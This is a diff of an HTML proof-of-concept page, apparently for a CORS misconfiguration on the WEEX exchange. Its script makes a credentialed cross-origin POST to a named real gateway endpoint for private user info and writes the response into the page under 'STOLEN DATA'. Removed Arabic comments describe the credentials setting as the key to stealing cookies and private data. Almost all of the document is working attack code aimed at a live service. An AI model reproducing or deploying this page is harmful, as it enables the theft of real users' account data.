@@ -1,47 +1,33 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
-    <title>WEEX Security PoC</title>
+    <title>WEEX PoC</title>
 </head>
-<body style="background-color: #f4f4f4; font-family: sans-serif; padding: 20px;">
-    <h1 style="color: red;">Exploit Success: Sensitive Data Extracted</h1>
-    <div id="results" style="background: white; border: 2px solid #333; padding: 15px; overflow-x: auto;">
-        <h3>Waiting for data from WEEX Gateway...</h3>
+<body style="font-family: Arial; padding: 20px;">
+    <h1 style="color: red;">WEEX Exploit Success</h1>
+    <div id="results" style="border: 2px solid black; padding: 15px; background: #f9f9f9;">
+        <h3>Waiting for data...</h3>
     </div>
 
     <script>
-        // الرابط اللي إنت طلعته من Burp
         const targetUrl = "https://http-gateway2.janapw.com/api/v1/private/trace/user/getTraceUserInfo";
         
         fetch(targetUrl, {
             method: "POST",
-            mode: "cors", // تفعيل وضع CORS
-            credentials: "include", // أهم سطر لسرقة الكوكيز والبيانات الخاصة
+            credentials: "include",
             headers: {
                 "Content-Type": "application/json;charset=utf-8",
                 "Terminaltype": "1"
             },
             body: JSON.stringify({"languageType": 0})
         })
-        .then(response => {
-            if (!response.ok) throw new Error('HTTP error! status: ' + response.status);
-            return response.json();
-        })
+        .then(res => res.json())
         .then(data => {
-            // عرض البيانات المسروقة بوضوح في الصفحة
-            document.getElementById("results").innerHTML = 
-                <h2 style="color: green;">✅ Data Stolen Successfully:</h2>
-                <pre>${JSON.stringify(data, null, 4)}</pre>
-            ;
+            document.getElementById("results").innerHTML = "<h2>✅ STOLEN DATA:</h2><pre>" + JSON.stringify(data, null, 4) + "</pre>";
         })
-        .catch(error => {
-            document.getElementById("results").innerHTML = 
-                <h2 style="color: red;">❌ Extraction Failed</h2>
-                <p>Reason: ${error.message}</p>
-                <p>Check Console (F12) to see if CORS blocked the response.</p>
-            ;
-            console.error('Error Details:', error);
+        .catch(err => {
+            document.getElementById("results").innerHTML = "<h2>❌ Error:</h2>" + err;
         });
     </script>
 </body>
